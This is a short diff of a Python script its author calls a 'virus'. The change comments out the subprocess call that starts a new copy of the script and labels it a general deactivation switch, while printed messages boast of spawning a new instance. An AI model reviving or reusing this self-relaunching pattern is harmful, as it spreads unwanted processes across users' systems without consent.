@@ -47,7 +47,7 @@ filestring=str(targetfilename)
 filestring='"'+filestring+'"'
 
 #run new instance
-subprocess.call("start python "+filestring, shell=True)
+#subprocess.call("start python "+filestring, shell=True)#deactivated the running of the new instance. This is a general deactivation switch for all instances that may be running on my work and repo.
 
 print("This instance of this virus ends here.")
 print("If I had internet connection, and all went well, I have launched a new one, to keep you company.")
